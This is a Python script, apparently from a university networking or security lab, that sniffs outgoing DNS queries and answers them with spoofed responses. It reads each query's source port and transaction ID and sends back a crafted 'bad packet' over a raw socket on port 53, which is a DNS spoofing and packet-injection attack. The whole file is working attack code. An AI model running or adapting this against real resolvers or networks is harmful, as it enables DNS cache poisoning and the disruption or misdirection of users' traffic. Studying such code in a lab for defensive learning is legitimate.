'''
bad_packet_launcher.py

Send a bad packet to the receiver
'''

import socket
import ipaddress
import scapy.all as network
import struct
import threading

import bad_packet

class SniffSniff(threading.Thread):

    def __init__(self, outer_scope):
        threading.Thread.__init__(self)

        self.__outer_scope = outer_scope
        self.__question    = None
        self.__receiver    = None
        self.__isrunning   = True

    def __get_packet(self, packet):
        if network.DNS in packet and\
        ipaddress.IPv4Address(packet[network.IP].src) not in ipaddress.IPv4Network("129.22.0.0/16"):

            self.__outer_scope.__dict__["_BadPacketLauncher__question"] = packet[network.UDP].sport, packet[network.DNS].id
            self.__outer_scope.__dict__["_BadPacketLauncher__receiver"] = packet[network.IP].src

    def run(self):
        while(self.__isrunning):
            network.sniff(filter="ip and udp", prn=self.__get_packet, timeout=5)

    def terminate(self):
        self.__isrunning = False


class BadPacketLauncher(object):

    def __init__(self):
        self.__master = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        self.__master.bind(("", 53))

        self.__question = None

        self.__receiver = None

    @staticmethod
    def correct_packet(source_port, identification):
        UDP_header = network.UDP(sport=53, dport=source_port)
        raw_packet = network.DNS(id=identification, 
        ancount=1,
        an=network.DNSRR(rrname="one.yumi.ipl.eecs.case.edu",rdata="129.22.150.112"))

        return UDP_header / raw_packet
        

    def __udp_spoofing(self, identification, dest) -> None:
        '''
        rewrite the UDP header so that the response will be
        sent to another socket
        '''
        bad = bad_packet.bad_packet(identification)
        destination_port = dest
        length = 8 + len(bad)

        return struct.pack("!4H", 53, destination_port, length, 0) + bad

    def run(self):
        
        try:
            sniffer = SniffSniff(self)
            sniffer.start()

            while(True):
                if self.__receiver and self.__question:
                    print("Server", self.__receiver, "ID:", int(self.__question[0]))

                    source, identification = self.__question

                    print("sending...")
                    self.__master.sendto(
                        self.__udp_spoofing(identification, source), 
                        (self.__receiver, int(self.__question[0])))
                    
                    self.__receiver = None
                    self.__question = None

        except KeyboardInterrupt:
            sniffer.terminate()
            exit(0)

        except TypeError:
            exit(1)



if __name__ == "__main__":
    bad_packet_instance = BadPacketLauncher()

    bad_packet_instance.run()





